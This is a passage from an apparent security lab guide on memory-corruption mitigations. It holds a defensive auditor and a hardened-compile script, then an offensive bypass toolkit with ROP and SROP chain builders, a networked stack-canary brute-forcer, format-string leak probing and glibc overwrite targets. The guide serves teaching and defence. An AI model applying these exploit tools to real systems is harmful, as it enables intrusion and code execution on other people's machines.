    def check_system_mitigations(self):
        """Assess kernel/system-level mitigations."""
        checks = {}

        # ASLR
        with open('/proc/sys/kernel/randomize_va_space') as f:
            aslr_val = int(f.read().strip())
        checks['aslr'] = {
            'value': aslr_val,
            'status': 'FULL' if aslr_val == 2 else 'PARTIAL' if aslr_val == 1 else 'DISABLED',
            'severity': 'OK' if aslr_val == 2 else 'CRITICAL'
        }

        # KASLR
        kaslr_enabled = True
        try:
            with open('/proc/kallsyms') as f:
                line = f.readline()
                addr = int(line.split()[0], 16)
                if addr == 0:
                    kaslr_enabled = True  # kptr_restrict hides it
                elif addr == 0xffffffff81000000:
                    kaslr_enabled = False
        except:
            pass
        checks['kaslr'] = {
            'status': 'ENABLED' if kaslr_enabled else 'DISABLED',
            'severity': 'OK' if kaslr_enabled else 'HIGH'
        }

        # kptr_restrict
        try:
            with open('/proc/sys/kernel/kptr_restrict') as f:
                kptr = int(f.read().strip())
        except:
            kptr = -1
        checks['kptr_restrict'] = {
            'value': kptr,
            'status': 'RESTRICTED' if kptr >= 1 else 'UNRESTRICTED',
            'severity': 'OK' if kptr >= 1 else 'MEDIUM'
        }

        # dmesg_restrict
        try:
            with open('/proc/sys/kernel/dmesg_restrict') as f:
                dmesg = int(f.read().strip())
        except:
            dmesg = -1
        checks['dmesg_restrict'] = {
            'value': dmesg,
            'status': 'RESTRICTED' if dmesg == 1 else 'UNRESTRICTED',
            'severity': 'OK' if dmesg == 1 else 'MEDIUM'
        }

        # Yama ptrace scope
        try:
            with open('/proc/sys/kernel/yama/ptrace_scope') as f:
                yama = int(f.read().strip())
        except:
            yama = -1
        checks['yama_ptrace'] = {
            'value': yama,
            'status': ['CLASSIC', 'RESTRICTED', 'ADMIN_ONLY', 'DISABLED'][yama] if 0 <= yama <= 3 else 'UNKNOWN',
            'severity': 'OK' if yama >= 1 else 'MEDIUM'
        }

        # Unprivileged BPF
        try:
            with open('/proc/sys/kernel/unprivileged_bpf_disabled') as f:
                bpf = int(f.read().strip())
        except:
            bpf = -1
        checks['unprivileged_bpf'] = {
            'value': bpf,
            'status': 'DISABLED' if bpf >= 1 else 'ENABLED',
            'severity': 'OK' if bpf >= 1 else 'MEDIUM'
        }

        # KPTI
        kpti = False
        try:
            result = subprocess.run(['dmesg'], capture_output=True, text=True)
            if 'page tables isolation: enabled' in result.stdout.lower():
                kpti = True
            # Also check /sys
            if os.path.exists('/sys/kernel/debug/x86/pti_enabled'):
                with open('/sys/kernel/debug/x86/pti_enabled') as f:
                    kpti = f.read().strip() == '1'
        except:
            pass
        checks['kpti'] = {
            'status': 'ENABLED' if kpti else 'UNKNOWN/DISABLED',
            'severity': 'OK' if kpti else 'HIGH'
        }

        # CET support
        cet_available = False
        try:
            with open('/proc/cpuinfo') as f:
                cpuinfo = f.read()
                cet_available = 'shstk' in cpuinfo or 'ibt' in cpuinfo
        except:
            pass
        checks['cet_hardware'] = {
            'status': 'AVAILABLE' if cet_available else 'NOT AVAILABLE',
            'severity': 'INFO'
        }

        self.system_checks = checks
        return checks

    def check_binary(self, binary_path: str) -> MitigationReport:
        """Analyze a single binary's mitigation posture."""
        report = MitigationReport(binary=binary_path)

        try:
            result = subprocess.run(
                ['checksec', '--file', binary_path, '--output', 'json'],
                capture_output=True, text=True, timeout=10
            )
            data = json.loads(result.stdout)
            info = list(data.values())[0]

            report.nx = info.get('nx', '') == 'yes'
            report.pie = info.get('pie', '') in ('yes', 'PIE')
            report.canary = info.get('canary', '') == 'yes'
            report.fortify = info.get('fortify_source', '') == 'yes'

            relro = info.get('relro', '').lower()
            if 'full' in relro:
                report.relro = 'full'
            elif 'partial' in relro:
                report.relro = 'partial'
            else:
                report.relro = 'none'

            report.rpath = info.get('rpath', '') == 'yes'
            report.runpath = info.get('runpath', '') == 'yes'

        except (subprocess.TimeoutExpired, json.JSONDecodeError, FileNotFoundError):
            # Fallback: use readelf
            try:
                result = subprocess.run(
                    ['readelf', '-l', '-d', binary_path],
                    capture_output=True, text=True
                )
                output = result.stdout
                report.nx = 'GNU_STACK' in output and 'RWE' not in output
                report.pie = 'DYN' in output or 'Position Independent' in output
            except:
                pass

        # Score calculation
        score = 0
        if report.nx: score += 15
        if report.pie: score += 20
        if report.canary: score += 15
        if report.relro == 'full': score += 20
        elif report.relro == 'partial': score += 10
        if report.fortify: score += 10
        if not report.rpath: score += 5
        if not report.runpath: score += 5
        report.score = score

        # Identify issues
        if not report.nx:
            report.issues.append('CRITICAL: NX/DEP disabled — shellcode injection trivial')
        if not report.pie:
            report.issues.append('HIGH: No PIE — binary addresses known, ASLR partially ineffective')
        if not report.canary:
            report.issues.append('HIGH: No stack canary — stack overflow directly controls RIP')
        if report.relro == 'none':
            report.issues.append('HIGH: No RELRO — GOT fully writable')
        elif report.relro == 'partial':
            report.issues.append('MEDIUM: Partial RELRO — GOT.PLT still writable')
        if not report.fortify:
            report.issues.append('LOW: No FORTIFY_SOURCE — buffer overflow checks absent')
        if report.rpath:
            report.issues.append('MEDIUM: RPATH set — potential library injection')

        self.reports.append(report)
        return report

    def scan_directory(self, directory: str, pattern: str = '*'):
        """Scan all ELF binaries in a directory."""
        path = Path(directory)
        for f in path.rglob(pattern):
            if f.is_file() and os.access(str(f), os.X_OK):
                try:
                    result = subprocess.run(
                        ['file', str(f)], capture_output=True, text=True
                    )
                    if 'ELF' in result.stdout:
                        self.check_binary(str(f))
                except:
                    pass

    def print_report(self):
        """Generate formatted audit report."""
        print("=" * 80)
        print("MITIGATION POSTURE AUDIT REPORT")
        print("=" * 80)

        # System checks
        print("\n[SYSTEM-LEVEL MITIGATIONS]")
        print("-" * 40)
        for check, info in self.system_checks.items():
            severity = info.get('severity', 'INFO')
            status = info.get('status', 'UNKNOWN')
            marker = '✓' if severity == 'OK' else '✗' if severity in ('CRITICAL', 'HIGH') else '!'
            print(f"  [{marker}] {check:25s}: {status} ({severity})")

        # Binary checks
        if self.reports:
            print(f"\n[BINARY MITIGATIONS] ({len(self.reports)} binaries scanned)")
            print("-" * 40)

            # Sort by score (worst first)
            for report in sorted(self.reports, key=lambda r: r.score):
                print(f"\n  {report.binary}")
                print(f"    Score: {report.score}/90")
                print(f"    NX={report.nx} PIE={report.pie} Canary={report.canary} "
                      f"RELRO={report.relro} Fortify={report.fortify}")
                for issue in report.issues:
                    print(f"    → {issue}")

        # Summary
        print(f"\n{'=' * 80}")
        print("SUMMARY")
        critical = sum(1 for r in self.reports if r.score < 30)
        high = sum(1 for r in self.reports if 30 <= r.score < 50)
        medium = sum(1 for r in self.reports if 50 <= r.score < 70)
        good = sum(1 for r in self.reports if r.score >= 70)
        print(f"  Critical ({'{'}score<30{'}'})): {critical}")
        print(f"  High (30-49):     {high}")
        print(f"  Medium (50-69):   {medium}")
        print(f"  Good (70+):       {good}")


if __name__ == '__main__':
    import sys

    auditor = MitigationAuditor()

    # System checks
    auditor.check_system_mitigations()

    # Scan lab binaries
    if len(sys.argv) > 1:
        for path in sys.argv[1:]:
            if os.path.isdir(path):
                auditor.scan_directory(path)
            elif os.path.isfile(path):
                auditor.check_binary(path)
    else:
        auditor.scan_directory('/opt/labs')
        # Also scan common system binaries
        for sbin in ['/usr/sbin/sshd', '/usr/sbin/nginx', '/usr/bin/sudo']:
            if os.path.exists(sbin):
                auditor.check_binary(sbin)

    auditor.print_report()
```

---

### Exercise 3: Compiler-Level Mitigation Enforcement

**Objective:** Build a compilation wrapper that enforces maximum mitigation flags and validates output binaries.

```bash
#!/bin/bash
# hardened_compile.sh — Wrapper that enforces all available mitigations
# Usage: ./hardened_compile.sh gcc|clang source.c -o output [additional flags]

set -euo pipefail

COMPILER="${1:-gcc}"
shift

# Mandatory security flags
SECURITY_FLAGS=(
    # Stack protection
    "-fstack-protector-strong"
    "-fstack-clash-protection"

    # Position independent code
    "-fPIE"

    # Format string protection
    "-Wformat=2"
    "-Wformat-security"
    "-Werror=format-security"

    # Fortify source (runtime buffer overflow checks)
    "-D_FORTIFY_SOURCE=3"

    # Zero-initialize stack variables
    "-ftrivial-auto-var-init=zero"

    # Control flow integrity (Clang only)
    # "-fsanitize=cfi" (requires -flto)

    # No executable stack
    "-Wl,-z,noexecstack"

    # Full RELRO
    "-Wl,-z,relro"
    "-Wl,-z,now"

    # PIE linking
    "-pie"

    # Bind references at load time
    "-Wl,-z,defs"
)

# Additional hardening for Clang
CLANG_EXTRA=(
    "-fsanitize=safe-stack"
    # "-fsanitize=cfi -flto -fvisibility=hidden"  # Uncomment for CFI
)

# Build the command
CMD=("$COMPILER")
CMD+=("${SECURITY_FLAGS[@]}")

if [[ "$COMPILER" == *clang* ]]; then
    CMD+=("${CLANG_EXTRA[@]}")
fi

CMD+=("$@")

echo "[*] Compiling with hardened flags:"
echo "    ${CMD[*]}"
echo ""

"${CMD[@]}"

# Extract output binary name
OUTPUT=""
for i in "${!@}"; do
    if [[ "${!i}" == "-o" ]]; then
        next=$((i + 1))
        OUTPUT="${!next}"
        break
    fi
done

# Validate the output binary
if [[ -n "$OUTPUT" && -f "$OUTPUT" ]]; then
    echo ""
    echo "[*] Verifying mitigation posture of $OUTPUT:"
    checksec --file="$OUTPUT" 2>/dev/null || true

    echo ""
    # Additional verification
    ISSUES=0

    # Check NX
    if readelf -l "$OUTPUT" 2>/dev/null | grep -q "GNU_STACK.*RWE"; then
        echo "  [✗] FAIL: Executable stack detected"
        ISSUES=$((ISSUES + 1))
    else
        echo "  [✓] NX/DEP: Stack is non-executable"
    fi

    # Check PIE
    if readelf -h "$OUTPUT" 2>/dev/null | grep -q "DYN"; then
        echo "  [✓] PIE: Position-independent executable"
    else
        echo "  [✗] FAIL: Not a PIE binary"
        ISSUES=$((ISSUES + 1))
    fi

    # Check RELRO
    if readelf -l "$OUTPUT" 2>/dev/null | grep -q "GNU_RELRO"; then
        if readelf -d "$OUTPUT" 2>/dev/null | grep -q "BIND_NOW"; then
            echo "  [✓] Full RELRO: GOT is read-only"
        else
            echo "  [!] WARN: Only partial RELRO"
            ISSUES=$((ISSUES + 1))
        fi
    else
        echo "  [✗] FAIL: No RELRO"
        ISSUES=$((ISSUES + 1))
    fi

    # Check for canary
    if readelf -s "$OUTPUT" 2>/dev/null | grep -q "__stack_chk_fail"; then
        echo "  [✓] Stack canary: Present"
    else
        echo "  [✗] FAIL: No stack canary"
        ISSUES=$((ISSUES + 1))
    fi

    # Check for FORTIFY
    if readelf -s "$OUTPUT" 2>/dev/null | grep -q "__.*_chk"; then
        echo "  [✓] FORTIFY_SOURCE: Runtime checks present"
    else
        echo "  [!] WARN: No FORTIFY_SOURCE functions detected"
    fi

    echo ""
    if [[ $ISSUES -eq 0 ]]; then
        echo "[+] Binary passes all mitigation checks."
    else
        echo "[!] Binary has $ISSUES mitigation issues."
    fi
fi
```

---

## PART C: FRAMEWORK DEVELOPMENT

### Mitigation Bypass Analysis Toolkit

```python
#!/usr/bin/env python3
"""
mitigation_bypass_toolkit.py — Comprehensive framework for analyzing and
testing mitigation bypass techniques in controlled environments.

Modules:
  - ASLRAnalyzer: Entropy measurement, leak pattern detection
  - DEPBypassBuilder: Automated ROP chain construction
  - CanaryOracle: Fork-based brute-force with timing analysis
  - RELROTargetFinder: Identify writable code-pointer targets
  - DetectionValidator: Verify that detection rules fire correctly

Usage:
    from mitigation_bypass_toolkit import *

    # Analyze a binary's bypass surface
    analyzer = MitigationBypassAnalyzer('/path/to/binary')
    report = analyzer.full_analysis()
    report.print_summary()

    # Build a ROP chain for DEP bypass
    builder = DEPBypassBuilder('/path/to/binary', libc_path='/path/to/libc.so.6')
    chain = builder.build_mprotect_chain(target_addr=0x7fff00000000, size=0x1000)

    # Test detection rules against simulated attacks
    validator = DetectionValidator()
    validator.simulate_rwx_allocation()
    validator.check_sigma_fired('rwx_allocation')
"""

import os
import re
import struct
import time
import socket
import subprocess
import json
from dataclasses import dataclass, field
from typing import List, Tuple, Optional, Dict
from pathlib import Path
from enum import Enum, auto

try:
    from pwn import *
    PWNTOOLS_AVAILABLE = True
except ImportError:
    PWNTOOLS_AVAILABLE = False
    print("[!] pwntools not available — some features disabled")


class MitigationLevel(Enum):
    NONE = auto()
    PARTIAL = auto()
    FULL = auto()
    HARDWARE = auto()


@dataclass
class BypassDifficulty:
    """Estimated difficulty of bypassing a specific mitigation."""
    mitigation: str
    level: MitigationLevel
    bypass_techniques: List[str]
    estimated_effort: str  # "trivial", "moderate", "difficult", "infeasible"
    prerequisites: List[str]
    detection_likelihood: str  # "low", "medium", "high"


@dataclass
class BinaryProfile:
    """Complete mitigation profile of a binary."""
    path: str
    arch: str = ''
    nx: bool = False
    pie: bool = False
    canary: bool = False
    relro: str = 'none'
    fortify: bool = False
    stripped: bool = False
    static: bool = False
    gadget_count: int = 0
    libc_version: str = ''
    aslr_entropy: Dict[str, int] = field(default_factory=dict)
    bypass_paths: List[BypassDifficulty] = field(default_factory=list)


class ASLRAnalyzer:
    """Analyze ASLR entropy and identify leak opportunities."""

    def __init__(self, binary_path: str):
        self.binary_path = binary_path
        self.samples: Dict[str, List[int]] = {
            'text': [], 'libc': [], 'stack': [],
            'heap': [], 'vdso': []
        }

    def measure_entropy(self, num_samples: int = 100) -> Dict[str, int]:
        """Measure actual ASLR entropy by sampling addresses across executions."""
        for _ in range(num_samples):
            try:
                result = subprocess.run(
                    ['bash', '-c', f'cat /proc/$(pidof -s {self.binary_path})/maps 2>/dev/null || '
                                   f'timeout 0.1 {self.binary_path} &'
                                   f' sleep 0.05 && cat /proc/$!/maps && kill $!'],
                    capture_output=True, text=True, timeout=5
                )
                self._parse_maps(result.stdout)
            except:
                pass

        entropy = {}
        for region, addrs in self.samples.items():
            if len(addrs) > 1:
                unique = len(set(addrs))
                # Entropy ≈ log2(unique addresses)
                import math
                entropy[region] = int(math.log2(unique)) if unique > 1 else 0
        return entropy

    def _parse_maps(self, maps_output: str):
        """Extract region base addresses from /proc/PID/maps."""
        for line in maps_output.splitlines():
            parts = line.split()
            if len(parts) < 6:
                continue
            addr = int(parts[0].split('-')[0], 16)
            name = parts[-1] if len(parts) >= 6 else ''

            if 'libc' in name and 'libc' not in str(self.samples.get('libc_seen', '')):
                self.samples['libc'].append(addr)
            elif '[stack]' in name:
                self.samples['stack'].append(addr)
            elif '[heap]' in name:
                self.samples['heap'].append(addr)
            elif '[vdso]' in name:
                self.samples['vdso'].append(addr)

    def find_format_string_leaks(self, max_offset: int = 30) -> List[Tuple[int, str]]:
        """Probe format string offsets for pointer leaks (requires running binary)."""
        leaks = []
        if not PWNTOOLS_AVAILABLE:
            return leaks

        for offset in range(1, max_offset + 1):
            try:
                p = process(self.binary_path)
                p.sendline(f'%{offset}$p'.encode())
                result = p.recvline(timeout=2)
                p.close()

                match = re.search(rb'0x[0-9a-f]+', result)
                if match:
                    val = int(match.group(), 16)
                    region = self._classify_address(val)
                    if region != 'unknown':
                        leaks.append((offset, region))
            except:
                pass
        return leaks

    def _classify_address(self, addr: int) -> str:
        """Classify an address into its probable memory region."""
        if 0x7f0000000000 <= addr <= 0x7fffffffffff:
            if addr >= 0x7ffffffde000:
                return 'stack'
            return 'libc/mmap'
        elif 0x555555000000 <= addr <= 0x555555ffffff:
            return 'pie_text'
        elif 0x400000 <= addr <= 0x500000:
            return 'non_pie_text'
        elif addr >= 0xffff800000000000:
            return 'kernel'
        return 'unknown'

    def calculate_bruteforce_time(self, entropy_bits: int,
                                  attempts_per_sec: float = 100) -> float:
        """Calculate expected brute-force time given entropy."""
        total_attempts = 2 ** entropy_bits
        avg_attempts = total_attempts / 2
        return avg_attempts / attempts_per_sec


class DEPBypassBuilder:
    """Automated ROP chain construction for DEP bypass."""

    def __init__(self, binary_path: str, libc_path: str = ''):
        self.binary_path = binary_path
        self.libc_path = libc_path
        self.gadgets: Dict[str, int] = {}
        self._discover_gadgets()

    def _discover_gadgets(self):
        """Find essential gadgets using ROPgadget."""
        targets = [self.binary_path]
        if self.libc_path:
            targets.append(self.libc_path)

        for target in targets:
            try:
                result = subprocess.run(
                    ['ROPgadget', '--binary', target],
                    capture_output=True, text=True, timeout=60
                )
                self._parse_gadgets(result.stdout, target)
            except:
                pass

    def _parse_gadgets(self, output: str, source: str):
        """Parse ROPgadget output to find needed gadgets."""
        patterns = {
            'pop_rdi_ret': r'(0x[0-9a-f]+)\s*:\s*pop rdi\s*;\s*ret',
            'pop_rsi_ret': r'(0x[0-9a-f]+)\s*:\s*pop rsi\s*;\s*ret',
            'pop_rdx_ret': r'(0x[0-9a-f]+)\s*:\s*pop rdx\s*;\s*ret',
            'pop_rax_ret': r'(0x[0-9a-f]+)\s*:\s*pop rax\s*;\s*ret',
            'syscall_ret': r'(0x[0-9a-f]+)\s*:\s*syscall\s*;\s*ret',
            'ret':         r'(0x[0-9a-f]+)\s*:\s*ret$',
            'leave_ret':   r'(0x[0-9a-f]+)\s*:\s*leave\s*;\s*ret',
        }

        for name, pattern in patterns.items():
            if name not in self.gadgets:
                match = re.search(pattern, output, re.MULTILINE)
                if match:
                    self.gadgets[name] = int(match.group(1), 16)

    def build_mprotect_chain(self, target_addr: int, size: int = 0x1000,
                              base_offset: int = 0) -> bytes:
        """Build a ROP chain for mprotect(addr, size, RWX)."""
        if not PWNTOOLS_AVAILABLE:
            raise RuntimeError("pwntools required for chain construction")

        page_aligned = target_addr & ~0xfff
        chain = b''

        # pop rdi; ret → page-aligned address
        if 'pop_rdi_ret' in self.gadgets:
            chain += struct.pack('<Q', self.gadgets['pop_rdi_ret'] + base_offset)
            chain += struct.pack('<Q', page_aligned)
        else:
            raise ValueError("Missing pop rdi; ret gadget")

        # pop rsi; ret → size
        if 'pop_rsi_ret' in self.gadgets:
            chain += struct.pack('<Q', self.gadgets['pop_rsi_ret'] + base_offset)
            chain += struct.pack('<Q', size)
        else:
            raise ValueError("Missing pop rsi; ret gadget")

        # pop rdx; ret → PROT_READ|PROT_WRITE|PROT_EXEC
        if 'pop_rdx_ret' in self.gadgets:
            chain += struct.pack('<Q', self.gadgets['pop_rdx_ret'] + base_offset)
            chain += struct.pack('<Q', 7)
        else:
            raise ValueError("Missing pop rdx; ret gadget")

        # pop rax; ret → __NR_mprotect (10)
        if 'pop_rax_ret' in self.gadgets:
            chain += struct.pack('<Q', self.gadgets['pop_rax_ret'] + base_offset)
            chain += struct.pack('<Q', 10)
        else:
            raise ValueError("Missing pop rax; ret gadget")

        # syscall; ret
        if 'syscall_ret' in self.gadgets:
            chain += struct.pack('<Q', self.gadgets['syscall_ret'] + base_offset)
        else:
            raise ValueError("Missing syscall; ret gadget")

        return chain

    def build_srop_frame(self, syscall_nr: int, rdi: int = 0, rsi: int = 0,
                          rdx: int = 0, rip: int = 0, rsp: int = 0) -> bytes:
        """Build a sigreturn frame for SROP."""
        if not PWNTOOLS_AVAILABLE:
            raise RuntimeError("pwntools required")

        context.arch = 'amd64'
        frame = SigreturnFrame()
        frame.rax = syscall_nr
        frame.rdi = rdi
        frame.rsi = rsi
        frame.rdx = rdx
        frame.rip = rip
        frame.rsp = rsp
        return bytes(frame)

    def available_techniques(self) -> List[str]:
        """List available DEP bypass techniques based on found gadgets."""
        techniques = []
        if all(g in self.gadgets for g in ['pop_rdi_ret', 'pop_rsi_ret', 'pop_rdx_ret']):
            techniques.append('mprotect_rop')
            techniques.append('execve_rop')
            techniques.append('ret2libc')
        if 'pop_rax_ret' in self.gadgets and 'syscall_ret' in self.gadgets:
            techniques.append('srop')
            techniques.append('raw_syscall')
        if 'leave_ret' in self.gadgets:
            techniques.append('stack_pivot')
        return techniques


class CanaryOracle:
    """Byte-by-byte canary brute-force for fork servers."""

    def __init__(self, host: str, port: int, buffer_size: int):
        self.host = host
        self.port = port
        self.buffer_size = buffer_size
        self.canary = b'\x00'  # first byte always 0x00
        self.attempts = 0
        self.timing_data: List[float] = []

    def try_byte(self, known: bytes, candidate: int, timeout: float = 2.0) -> bool:
        """Test a single canary byte candidate."""
        self.attempts += 1
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((self.host, self.port))

            payload = b'A' * self.buffer_size + known + bytes([candidate])
            start = time.time()
            s.send(payload)

            try:
                response = s.recv(16)
                elapsed = time.time() - start
                self.timing_data.append(elapsed)
                s.close()
                return b'OK' in response  # adjust based on target's success indicator
            except socket.timeout:
                s.close()
                return False
        except Exception:
            return False

    def brute_force(self, verbose: bool = True) -> Optional[bytes]:
        """Execute full canary brute-force."""
        start_time = time.time()

        for byte_pos in range(1, 8):
            found = False
            for candidate in range(256):
                if self.try_byte(self.canary, candidate):
                    self.canary += bytes([candidate])
                    if verbose:
                        elapsed = time.time() - start_time
                        print(f"[+] Byte {byte_pos}: 0x{candidate:02x}  "
                              f"canary={self.canary.hex()}  "
                              f"({self.attempts} attempts, {elapsed:.1f}s)")
                    found = True
                    break
            if not found:
                if verbose:
                    print(f"[-] Failed at byte {byte_pos}")
                return None

        return self.canary

    def get_statistics(self) -> Dict:
        """Return brute-force statistics."""
        return {
            'total_attempts': self.attempts,
            'canary': self.canary.hex() if len(self.canary) == 8 else None,
            'avg_timing': sum(self.timing_data) / len(self.timing_data) if self.timing_data else 0,
            'success': len(self.canary) == 8
        }


class RELROTargetFinder:
    """Find writable code-pointer targets when GOT is read-only (Full RELRO)."""

    def __init__(self, libc_path: str):
        self.libc_path = libc_path
        self.targets: List[Dict] = []
        self._find_targets()

    def _find_targets(self):
        """Identify writable function-pointer targets in libc."""
        # Check glibc version for available targets
        result = subprocess.run(
            ['strings', self.libc_path], capture_output=True, text=True
        )
        version_match = re.search(r'GLIBC[_ ](\d+\.\d+)', result.stdout)
        glibc_version = float(version_match.group(1)) if version_match else 0

        # Targets by glibc version
        if glibc_version < 2.34:
            self.targets.append({
                'name': '__malloc_hook',
                'type': 'function_pointer',
                'difficulty': 'trivial',
                'trigger': 'any malloc() call',
                'deprecated_since': '2.34'
            })
            self.targets.append({
                'name': '__free_hook',
                'type': 'function_pointer',
                'difficulty': 'trivial',
                'trigger': 'any free() call',
                'deprecated_since': '2.34'
            })

        # Always available targets
        self.targets.extend([
            {
                'name': '_IO_list_all → FSOP',
                'type': '_IO_FILE vtable',
                'difficulty': 'moderate',
                'trigger': 'exit(), fflush(NULL), malloc failure',
                'notes': 'Post-2.24 requires _IO_str_overflow or _IO_wstr_overflow path'
            },
            {
                'name': '__exit_funcs',
                'type': 'atexit handler list',
                'difficulty': 'moderate',
                'trigger': 'exit()',
                'notes': 'Requires leaked pointer_guard (fs:0x30) for PTR_DEMANGLE'
            },
            {
                'name': 'link_map .fini_array',
                'type': 'destructor pointer',
                'difficulty': 'difficult',
                'trigger': 'process exit via _dl_fini',
                'notes': 'link_map in writable memory, references .fini_array'
            },
            {
                'name': 'tcache_perthread_struct',
                'type': 'allocator metadata',
                'difficulty': 'moderate',
                'trigger': 'next malloc/free of matching size',
                'notes': 'Corrupt tcache bins to get arbitrary alloc'
            },
            {
                'name': 'stdout._IO_FILE vtable',
                'type': '_IO_FILE vtable',
                'difficulty': 'moderate',
                'trigger': 'next printf/puts call',
                'notes': 'Requires heap overlap with FILE structure'
            }
        ])

    def recommend_target(self, primitives: List[str]) -> Dict:
        """Recommend the best target given available exploitation primitives."""
        # primitives: ['arbitrary_write', 'heap_overflow', 'uaf', 'info_leak']
        if 'arbitrary_write' in primitives:
            # Direct write → simplest target
            for t in self.targets:
                if t['difficulty'] == 'trivial':
                    return t
            return self.targets[0]  # FSOP
        elif 'uaf' in primitives or 'heap_overflow' in primitives:
            # Heap corruption → tcache or FSOP
            for t in self.targets:
                if 'tcache' in t['name'] or 'FSOP' in t['name']:
                    return t
        return self.targets[0]

    def print_targets(self):
        """Display all known targets."""
        print("\n[Full RELRO Bypass Targets]")
        print("-" * 60)
        for t in self.targets:
            print(f"\n  Target: {t['name']}")
            print(f"  Type: {t['type']}")
            print(f"  Difficulty: {t['difficulty']}")
            print(f"  Trigger: {t['trigger']}")
            if 'notes' in t:
                print(f"  Notes: {t['notes']}")
            if 'deprecated_since' in t:
                print(f"  ⚠ Removed since glibc {t['deprecated_since']}")


class MitigationBypassAnalyzer:
    """Comprehensive analysis combining all modules."""

    def __init__(self, binary_path: str, libc_path: str = ''):
        self.binary_path = binary_path
        self.libc_path = libc_path or self._find_libc()
        self.profile = BinaryProfile(path=binary_path)

    def _find_libc(self) -> str:
        """Locate libc for the target binary."""
        try:
            result = subprocess.run(
                ['ldd', self.binary_path], capture_output=True, text=True
            )
            match = re.search(r'libc\S*\s+=>\s+(\S+)', result.stdout)
            if match:
                return match.group(1)
        except:
            pass
        return '/lib/x86_64-linux-gnu/libc.so.6'

    def full_analysis(self) -> BinaryProfile:
        """Run complete mitigation analysis."""
        self._analyze_mitigations()
        self._analyze_gadgets()
        self._determine_bypass_paths()
        return self.profile

    def _analyze_mitigations(self):
        """Check all mitigations on the binary."""
        try:
            result = subprocess.run(
                ['checksec', '--file', self.binary_path, '--output', 'json'],
                capture_output=True, text=True, timeout=10
            )
            data = json.loads(result.stdout)
            info = list(data.values())[0]

            self.profile.nx = info.get('nx', '') == 'yes'
            self.profile.pie = 'pie' in info.get('pie', '').lower()
            self.profile.canary = info.get('canary', '') == 'yes'
            relro = info.get('relro', '').lower()
            self.profile.relro = 'full' if 'full' in relro else 'partial' if 'partial' in relro else 'none'
            self.profile.fortify = info.get('fortify_source', '') == 'yes'
        except:
            pass

    def _analyze_gadgets(self):
        """Count available ROP gadgets."""
        try:
            result = subprocess.run(
                ['ROPgadget', '--binary', self.binary_path],
                capture_output=True, text=True, timeout=30
            )
            self.profile.gadget_count = result.stdout.count('\n') - 2
        except:
            pass

    def _determine_bypass_paths(self):
        """Identify viable bypass paths based on mitigations present."""
        paths = []

        if not self.profile.nx:
            paths.append(BypassDifficulty(
                mitigation='DEP/NX',
                level=MitigationLevel.NONE,
                bypass_techniques=['direct_shellcode'],
                estimated_effort='trivial',
                prerequisites=['stack/heap overflow'],
                detection_likelihood='low'
            ))
        else:
            paths.append(BypassDifficulty(
                mitigation='DEP/NX',
                level=MitigationLevel.FULL,
                bypass_techniques=['rop_mprotect', 'rop_mmap', 'ret2libc', 'srop'],
                estimated_effort='moderate',
                prerequisites=['stack overflow', 'gadgets available', 'ASLR bypass'],
                detection_likelihood='medium'
            ))

        if not self.profile.pie:
            paths.append(BypassDifficulty(
                mitigation='ASLR (binary)',
                level=MitigationLevel.NONE,
                bypass_techniques=['known_binary_addresses'],
                estimated_effort='trivial',
                prerequisites=[],
                detection_likelihood='low'
            ))

        if not self.profile.canary:
            paths.append(BypassDifficulty(
                mitigation='Stack Canary',
                level=MitigationLevel.NONE,
                bypass_techniques=['direct_overflow'],
                estimated_effort='trivial',
                prerequisites=['stack overflow'],
                detection_likelihood='low'
            ))
        else:
            paths.append(BypassDifficulty(
                mitigation='Stack Canary',
                level=MitigationLevel.FULL,
                bypass_techniques=['info_leak', 'fork_bruteforce', 'seh_overwrite'],
                estimated_effort='moderate',
                prerequisites=['format string or over-read', 'or fork server'],
                detection_likelihood='high'
            ))

        if self.profile.relro == 'none':
            paths.append(BypassDifficulty(
                mitigation='RELRO',
                level=MitigationLevel.NONE,
                bypass_techniques=['got_overwrite'],
                estimated_effort='trivial',
                prerequisites=['arbitrary write'],
                detection_likelihood='low'
            ))
        elif self.profile.relro == 'partial':
            paths.append(BypassDifficulty(
                mitigation='RELRO',
                level=MitigationLevel.PARTIAL,
                bypass_techniques=['got_plt_overwrite'],
                estimated_effort='trivial',
                prerequisites=['arbitrary write to GOT.PLT'],
                detection_likelihood='low'
            ))
        else:
            paths.append(BypassDifficulty(
                mitigation='RELRO',
                level=MitigationLevel.FULL,
                bypass_techniques=['fsop', 'exit_funcs', 'link_map', 'tcache_poison'],
                estimated_effort='difficult',
                prerequisites=['heap corruption', 'libc leak', 'glibc version knowledge'],
                detection_likelihood='medium'
            ))

        self.profile.bypass_paths = paths

    def print_summary(self):
        """Print analysis summary."""
        p = self.profile
        print(f"\n{'=' * 70}")
        print(f"MITIGATION BYPASS ANALYSIS: {p.path}")
        print(f"{'=' * 70}")
        print(f"\n  Mitigations: NX={p.nx} PIE={p.pie} Canary={p.canary} "
              f"RELRO={p.relro} Fortify={p.fortify}")
        print(f"  Gadgets available: {p.gadget_count}")

        print(f"\n  Bypass Paths:")
        for bp in p.bypass_paths:
            effort_color = {'trivial': '!!!', 'moderate': '!!', 'difficult': '!', 'infeasible': ''}
            print(f"\n    [{bp.mitigation}] Level={bp.level.name}")
            print(f"      Effort: {bp.estimated_effort} {effort_color.get(bp.estimated_effort, '')}")
            print(f"      Techniques: {', '.join(bp.bypass_techniques)}")
            print(f"      Prerequisites: {', '.join(bp.prerequisites)}")
            print(f"      Detection: {bp.detection_likelihood}")


# ===== ENTRY POINT =====
if __name__ == '__main__':
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 mitigation_bypass_toolkit.py <binary> [libc]")
        print("\nExamples:")
        print("  python3 mitigation_bypass_toolkit.py /opt/labs/aslr/vuln_fmt_aslr")
        print("  python3 mitigation_bypass_toolkit.py /opt/labs/heap/vuln_tcache /lib/x86_64-linux-gnu/libc.so.6")
        sys.exit(1)

    binary = sys.argv[1]
    libc = sys.argv[2] if len(sys.argv) > 2 else ''

    # Full analysis
    analyzer = MitigationBypassAnalyzer(binary, libc)
    analyzer.full_analysis()
    analyzer.print_summary()

    # RELRO targets
    if analyzer.profile.relro == 'full' and libc:
        finder = RELROTargetFinder(libc)
        finder.print_targets()

    # DEP bypass options
    if analyzer.profile.nx:
        builder = DEPBypassBuilder(binary, libc)
        techniques = builder.available_techniques()
        print(f"\n  Available DEP bypass techniques: {techniques}")
```

---

## Lab Validation Checklist

### Part A Verification

- [ ] Exercise 1: Format string leaks libc address, ret2libc spawns shell
